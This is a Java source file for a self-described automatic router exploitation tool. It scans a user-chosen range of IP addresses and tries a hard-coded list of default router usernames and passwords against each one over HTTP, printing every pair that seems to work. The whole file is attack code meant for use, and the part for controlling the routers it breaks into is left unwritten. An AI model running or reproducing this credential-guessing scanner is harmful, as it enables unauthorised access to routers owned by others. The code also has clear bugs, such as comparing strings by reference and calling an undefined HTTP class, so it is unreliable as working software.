import java.util.Scanner;
import java.lang.String;
import org.apache.commons.lang3.StringUtils;
import java.io.IOException;

class autoRouterExploiter {
    public static void main() {
        //An automatic router exploitation tool
        //Written as a potential entry to the NSA Playset
        String readme0 = "This automatic router exploitation tool was programmed by 323.";
        String readme1 = "Please stop trying to decompile/reverse engineer it :)";
        HTTPRequest request = new HTTPRequest();
        Scanner input = new Scanner(System.in);
        String startIP; //The start of the IP range to scan
        String endIP; //The end fo the IP range to scan
        String delim = "[.]"; //The delimiter for parsing IP addresses
        boolean firsteq = false;
        boolean secondeq = false;
        boolean thirdeq = false;
        boolean fourtheq = false;
        boolean firstloop;
        int plusone; //A temporary int for storing values as they're added
        String currentip; //To save the value of the current IP while scanning
        String source; //To save the source of the page
        String source2; //To save another page source, for comparing sources
        String url; //Used to store the full URL
        ///// vvv Usernames and Passwords vvv /////
        String[] usernames = {"administrator", "admin", "root", "user", "", "2Wire", "tech", "debug", "synnet", "adm", "recovery", "Administrator", "Admin"};
        String[] passwords = {"administrator", "admin", "root", "user", "", "pass", "password", "alpine", "public", "Wireless", "tech", "debug", "synnet", "adm", "recovery", "Administrator", "Admin"};
        ///// ^^^ Usernames and Passwords ^^^ /////
        System.out.println("[?] The program will begin by scanning and attempting to access any routers in an IP range of your choice");
        System.out.println("[?] After that, you will be able to exploit/control/modify any of the successfully exploited routers.");
        System.out.println("[+] Enter the start IP (For example, if you were scanning from 192.168.1.1 to 193.150.1.100, the start IP would be 192.168.1.1)");
        startIP = input.nextLine();
        String[] startIPTokens = startIP.split(delim);
        if (startIPTokens.length > 4) { //IP Address has more than 3 periods in it
            System.out.println("[!] ERROR: You appear to have entered an invalid IP address. Exiting.");
            System.exit(0);
        }
        System.out.println("[+] Enter the end IP (For example, if you were scanning from 192.168.1.1 to 193.150.1.100, the start IP would be 193.150.1.100)");
        endIP = input.nextLine();
        String[] endIPTokens = endIP.split(delim);
        if (endIPTokens.length > 4) { //IP Address has more than 3 periods in it
            System.out.println("[!] ERROR: You appear to have entered an invalid IP address. Exiting.");
            System.exit(0);
        }
        if (Integer.parseInt(endIPTokens[0]) < Integer.parseInt(startIPTokens[0])) {
            System.out.println("[!] ERROR: You appear to be trying to scan backwards! Your end IP address is less than your starting IP! Exiting.");
            System.exit(0);
        }
        System.out.println("[~] Scanning from " + startIP + " to " + endIP + "...");
        int i=0;
        while (i==0) {
            if (i==0) { //If the loop is still running
                currentip = startIPTokens[0] + "." + startIPTokens[1] + "." + startIPTokens[2] + "." + startIPTokens[3];
                System.out.println(currentip);
                //Now we start the process of trying to see if a router is there, and trying to log in
                source = request.get("http://" + currentip);
                System.out.println(source);
                if (source != null && source != "timeout") {
                    for (int k=0; k<usernames.length; k++) {
                        for (int j=0; j<passwords.length; j++) {
                            url = "http://" + usernames[k] + ":" + passwords[j] + "@" + currentip;
                            source2 = request.get(url);
                            if (source2 == null) {
                                //Combo is bad
                            } else if (source2 != null && source2 != "timeout") {
                                System.out.println(source2);
                                System.out.println("[+] Possible good combo found. Username: " + usernames[k] + " Password: " + passwords[j]);
                            } else {
                                System.out.println(source2);
                                System.out.println("[?] Results unknown. Try manually testing. Username: " + usernames[k] + " Password: " + passwords[j]);
                            }
                        }
                    }
                }
            }
            if (Integer.parseInt(startIPTokens[0]) <= Integer.parseInt(endIPTokens[0])) {
                if (Integer.parseInt(startIPTokens[0]) == Integer.parseInt(endIPTokens[0])) {
                    firsteq = true;
                    if (Integer.parseInt(startIPTokens[1]) == Integer.parseInt(endIPTokens[1])) {
                        secondeq = true;
                        if (Integer.parseInt(startIPTokens[2]) == Integer.parseInt(endIPTokens[2])) {
                            thirdeq = true;
                            if (Integer.parseInt(startIPTokens[3]) == Integer.parseInt(endIPTokens[3])) {
                                fourtheq = true;
                            }
                        }
                    }
                }
                if (firsteq == true && secondeq == true && thirdeq == true && fourtheq == true) {
                    System.out.println("[!] Maximum IP reached! Finished scanning. Organizing results...");
                    i = 1;
                }
                if (firsteq == true && secondeq == true && thirdeq == true && fourtheq == false) {
                    if (Integer.parseInt(startIPTokens[3]) == 255) {
                        System.out.println("[!] ERROR: The 4th digit of the IP address has somehow exceeded 255! Exiting.");
                        System.exit(0);
                    } else if (Integer.parseInt(startIPTokens[3]) < 255) {
                        if ((startIPTokens[0] + "." + startIPTokens[1] + "." + startIPTokens[2] + "." + startIPTokens[3]) == startIP) {
                            //Do nothing
                        } else {
                            plusone = Integer.parseInt(startIPTokens[3]) + 1; //Add one to the current 4th digit of the IP
                            startIPTokens[3] = Integer.toString(plusone); //Set the value
                        }
                    } else {
                        System.out.println("[!] ERROR: The 4th digit of the IP address has somehow exceeded 255! Exiting.");
                        System.exit(0);
                    }
                }
                if (firsteq == true && secondeq == true && thirdeq == false && fourtheq == false) {
                    if (Integer.parseInt(startIPTokens[3]) == 255) {
                        if (Integer.parseInt(startIPTokens[2]) == 255) {
                            System.out.println("[!] ERROR: The 3rd digit of the IP address has somehow exceeded 255! Exiting.");
                            System.exit(0);
                        } else if (Integer.parseInt(startIPTokens[2]) < 255) {
                            plusone = Integer.parseInt(startIPTokens[2]) + 1; //Add one to the current 3rd digit of the IP
                            startIPTokens[2] = Integer.toString(plusone); //Set the value
                            startIPTokens[3] = Integer.toString(0); //Set the value of the 4th digit to 0
                        } else {
                            System.out.println("[!] ERROR: The 3rd digit of the IP address has somehow exceeded 255! Exiting.");
                            System.exit(0);
                        }
                    } else if (Integer.parseInt(startIPTokens[3]) < 255) {
                        plusone = Integer.parseInt(startIPTokens[3]) + 1; //Add one to the current 4th digit of the IP
                        startIPTokens[3] = Integer.toString(plusone); //Set the value
                    } else {
                        System.out.println("[!] ERROR: The 4th digit of the IP address has somehow exceeded 255! Exiting.");
                        System.exit(0);
                    }
                }
                if (firsteq == true && secondeq == false && thirdeq == false && fourtheq == false) {
                    if (Integer.parseInt(startIPTokens[3]) == 255) {
                        if (Integer.parseInt(startIPTokens[2]) == 255) {
                            if (Integer.parseInt(startIPTokens[1]) == 255) {
                                System.out.println("[!] ERROR: The 2nd digit of the IP address has somehow exceeded 255! Exiting.");
                                System.exit(0);
                            } else if (Integer.parseInt(startIPTokens[1]) < 255) {
                                plusone = Integer.parseInt(startIPTokens[1]) + 1; //Add one to the current 2nd digit of the IP
                                startIPTokens[1] = Integer.toString(plusone); //Set the value
                                startIPTokens[2] = Integer.toString(0); //Set the value of the 3rd digit to 0
                            } else {
                                System.out.println("[!] ERROR: The 2nd digit of the IP address has somehow exceeded 255! Exiting.");
                            }
                        } else if (Integer.parseInt(startIPTokens[2]) < 255) {
                            plusone = Integer.parseInt(startIPTokens[2]) + 1; //Add one to the current 3rd digit of the IP
                            startIPTokens[2] = Integer.toString(plusone); //Set the value
                            startIPTokens[3] = Integer.toString(0); //Set the value of the 4th digit to 0
                        } else {
                            System.out.println("[!] ERROR: The 3rd digit of the IP address has somehow exceeded 255! Exiting.");
                            System.exit(0);
                        }
                    } else if (Integer.parseInt(startIPTokens[3]) < 255) {
                        plusone = Integer.parseInt(startIPTokens[3]) + 1; //Add one to the current 4th digit of the IP
                        startIPTokens[3] = Integer.toString(plusone); //Set the value
                    } else {
                        System.out.println("[!] ERROR: The 4th digit of the IP address has somehow exceeded 255! Exiting.");
                        System.exit(0);
                    }
                }
                if (firsteq == false && secondeq == false && thirdeq == false && fourtheq == false) {
                    if (Integer.parseInt(startIPTokens[3]) == 255) {
                        if (Integer.parseInt(startIPTokens[2]) == 255) {
                            if (Integer.parseInt(startIPTokens[1]) == 255) {
                                if (Integer.parseInt(startIPTokens[0]) == 255) {
                                    System.out.println("[!] ERROR: The 1st digit of the IP address has somehow exceeded 255! Exiting.");
                                    System.exit(0);
                                } else if (Integer.parseInt(startIPTokens[0]) < 255) {
                                    plusone = Integer.parseInt(startIPTokens[0]) + 1; //Add one to the current 1st digit of the IP
                                    startIPTokens[0] = Integer.toString(plusone); //Set the value
                                    startIPTokens[1] = Integer.toString(0); //Set the value of the 2nd digit to 0
                                } else {
                                    System.out.println("[!] ERROR: The 1st digit of the IP address has somehow exceeded 255! Exiting.");
                                    System.exit(0);
                                }
                            } else if (Integer.parseInt(startIPTokens[1]) < 255) {
                                plusone = Integer.parseInt(startIPTokens[1]) + 1; //Add one to the current 2nd digit of the IP
                                startIPTokens[1] = Integer.toString(plusone); //Set the value
                                startIPTokens[2] = Integer.toString(0); //set the value of the 3rd digit to 0
                            } else {
                                System.out.println("[!] ERROR: The 2nd digit of the IP address has somehow exceeded 255! Exiting.");
                            }
                        } else if (Integer.parseInt(startIPTokens[2]) < 255) {
                            plusone = Integer.parseInt(startIPTokens[2]) + 1; //Add one to the current 3rd digit of the IP
                            startIPTokens[2] = Integer.toString(plusone); //Set the value
                            startIPTokens[3] = Integer.toString(0); //Set the value fo the 4th digit to 0
                        } else {
                            System.out.println("[!] ERROR: The 3rd digit of the IP address has somehow exceeded 255! Exiting.");
                            System.exit(0);
                        }
                    } else if (Integer.parseInt(startIPTokens[3]) < 255) {
                        plusone = Integer.parseInt(startIPTokens[3]) + 1; //Add one to the current 4th digit of the IP
                        startIPTokens[3] = Integer.toString(plusone); //Set the value
                    } else {
                        System.out.println("[!] ERROR: The 4th digit of the IP address has somehow exceeded 255! Exiting.");
                        System.exit(0);
                    }
                }
            } else {
                System.out.println("[!] ERROR: The 1st digit of the IP address has somehow exceeded that of the end IP before we've even begun scanning! There was supposed to be a pre-flight check for that! Exiting.");
                System.exit(0);
            }
            //Here, we start interacting with the found routers
        }
    }
}